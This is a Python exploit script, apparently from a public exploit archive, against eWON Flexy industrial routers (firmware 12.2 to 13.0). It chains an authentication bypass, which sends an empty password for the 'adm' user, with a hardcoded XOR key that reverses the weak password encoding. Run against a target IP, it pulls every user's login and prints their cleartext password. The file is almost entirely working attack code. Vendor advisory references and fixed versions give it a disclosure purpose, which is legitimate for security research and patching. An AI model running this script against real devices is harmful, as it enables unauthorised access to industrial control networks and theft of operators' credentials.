#! /usr/bin/env python3
# -*- coding: utf-8 -*- 
''' 
    # Exploit Title: eWON v13.0 Authentication Bypass
    # Date: 2018-10-12
    # Exploit Author: Photubias – tijl[dot]Deneut[at]Howest[dot]be for www.ic4.be
    # Vendor Advisory: [1] https://websupport.ewon.biz/support/news/support/ewon-security-enhancement-131s0-0
    #                  [2] https://websupport.ewon.biz/support/news/support/ewon-security-vulnerability
    # Vendor Homepage: https://www.ewon.biz
    # Version: eWon Firmware 12.2 to 13.0
    # Tested on: eWon Flexy with Firmware 13.0s0
    
	Copyright 2019 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name eWON-Flewy-Pwn.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This script will perform retrieval of clear text credentials for an eWON Flexy router
         Tested on the eWON Flexy 201 with Firmware 13.0s0
         Only requires a valid username (default = adm) and 
         this user must have the Rights 'View IO' & 'Change Configuration'
         
        It combines two vulnerabilities: authentication bypass (fixed in 13.1s0)
          and a weak password encryption, allowing cleartext password retrievel for all users (fixed in 13.3s0)       
'''
username = b'adm'

import urllib.request, urllib.parse, base64, sys

def decode(encpass):
    bXorString = bytes.fromhex('6414FE6F4C964746900208FC9B3904963A2F61')
    def decodePass(bPass):
        if len(bPass) > 19:
            print('Error, password can not exceed 19 characters')
            return ''
        sClearPass = ''
        for i in range (len(bPass)): sClearPass+= chr(bPass[i] ^ bXorString[i])
        return sClearPass
    if encpass.startswith('#_'): encpass = encpass.split('_')[2]
    sEncodedPass = base64.b64decode(encpass)[:-2] ## last two bytes are checksum
    print('Decoded password:       {}'.format(decodePass(sEncodedPass)))

def getUserData(userid, strIP, sAuthHeader):
    sURL = 'http://{}/wrcgi.bin/wsdReadForm'.format(strIP)
    oHeaders = {'Authorization':'Basic {}'.format(sAuthHeader)}
    sPostList = r'["inf_HasJVM","usr_FirstName|1","usr_LastName|1","usr_Login|1","usr_Password|1","usr_Information|1","usr_Right|1","usr_AccessPage|1","usr_AccessDir|1","usr_CBEn|1","usr_CBMode|1","usr_CBPhNum|1","ols_AllAndAssignedPageList","ols_DirList","ols_CBMode"]'
    sPostList = sPostList.replace(r'|1',r'|'+str(userid))
    oData = {'wsdList' : sPostList}
    oData = urllib.parse.urlencode(oData).encode()
    oRequest = urllib.request.Request(sURL, headers = oHeaders, data = oData)
    #oRequest.set_proxy('127.0.0.1:8080','http')
    oResponse  = urllib.request.urlopen(oRequest)
    resultarr = oResponse.read().split(b'","')
    if len(resultarr) == 20:
        fname = resultarr[1].decode()
        lname = resultarr[2].decode()
        usern = resultarr[3].decode()
        if len(usern) == 0: return True
        encpassword = resultarr[4]
        print('Decoding pass for user: {} ({} {}) '.format(usern, fname, lname))
        decode(encpassword.decode())
        print('---')
    return True

if len(sys.argv) >= 2:
    strIP = sys.argv[1]
else:
    strIP = input('Please enter an IP [10.0.0.53]: ')
    if strIP == '': strIP = '10.0.0.53'
    print('---')

sAuthHeader = base64.b64encode(username + b':').strip(b'=').decode()

for i in range(1, 20):
    if not getUserData(i, strIP, sAuthHeader):
        print('### That\'s all folks ;-) ###')
        input()
        exit(0)
        
if len(sys.argv) < 2: input('All Done')
